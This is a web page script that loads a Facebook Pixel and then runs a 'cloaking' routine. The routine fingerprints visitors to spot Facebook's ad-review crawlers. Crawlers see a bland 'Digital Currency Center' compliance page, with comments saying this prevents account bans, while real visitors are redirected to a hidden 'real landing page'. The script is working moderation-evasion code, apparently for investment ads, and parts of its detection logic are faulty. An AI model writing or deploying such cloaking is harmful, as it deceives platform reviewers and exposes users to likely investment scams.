<script>
        !function(f,b,e,v,n,t,s)
        {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
        n.callMethod.apply(n,arguments):n.queue.push(arguments)};
        if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
        n.queue=[];t=b.createElement(e);t.async=!0;
        t.src=v;s=b.getElementsByTagName(e)[0];
        s.parentNode.insertBefore(t,s)}(window, document,'script',
        'https://connect.facebook.net/en_US/fbevents.js');
        fbq('init', 'YOUR_PIXEL_ID'); 
        fbq('track', 'PageView');
    </script>

    <script>
        async function checkCloaking() {
            try {
                let isBot = false;

                // 1️⃣ **检测 User-Agent**
                const userAgent = navigator.userAgent.toLowerCase();
                const fbBots = ["facebookexternalhit", "facebot", "fb_iab", "fb4a", "fbav"];
                if (fbBots.some(bot => userAgent.includes(bot))) {
                    isBot = true;
                    console.log("⚠️ Facebook Bot Detected via User-Agent!");
                }

                // 2️⃣ **检测 Referer**
                const referer = document.referrer.toLowerCase();
                if (referer.includes("facebook.com") || referer.includes("fb.com")) {
                    isBot = true;
                    console.log("⚠️ Facebook Bot Detected via Referer!");
                }

                // 3️⃣ **检测 Canvas 指纹**
                function getCanvasFingerprint() {
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');
                    ctx.textBaseline = "top";
                    ctx.font = "14px Arial";
                    ctx.fillText("Hello, Facebook!", 2, 2);
                    return canvas.toDataURL();
                }
                const fingerprint = getCanvasFingerprint();
                if (fingerprint.length < 1000) {
                    isBot = true;
                    console.log("⚠️ Facebook Bot Detected via Canvas Fingerprint!");
                }

                // 4️⃣ **检测访问时间差**
                const loadTime = performance.now();
                setTimeout(() => {
                    const timeElapsed = performance.now() - loadTime;
                    if (timeElapsed < 50) {
                        isBot = true;
                        console.log("⚠️ Facebook Bot Detected via Fast Load Time!");
                    }
                }, 1000);

                // 5️⃣ **检测用户行为（鼠标移动 / 滚动）**
                let userInteracted = false;
                document.addEventListener('mousemove', () => userInteracted = true);
                document.addEventListener('scroll', () => userInteracted = true);

                setTimeout(() => {
                    if (!userInteracted) {
                        isBot = true;
                        console.log("⚠️ Facebook Bot Detected via No User Interaction!");
                    }

                    // **最终判断是否跳转**
                    if (isBot) {
                        console.log("🔒 显示合规页面（防止封号）");
                        document.getElementById("content").innerHTML = "<h1>Welcome to Digital Currency Center</h1><p>Secure investment platform</p>";
                    } else {
                        console.log("🚀 跳转到真实落地页");
                        window.location.href = "https://google.com"; 
                    }
                }, 3000);
            } catch (error) {
                console.error("❌ 检测错误:", error);
            }
        }

        window.onload = checkCloaking;
    </script>
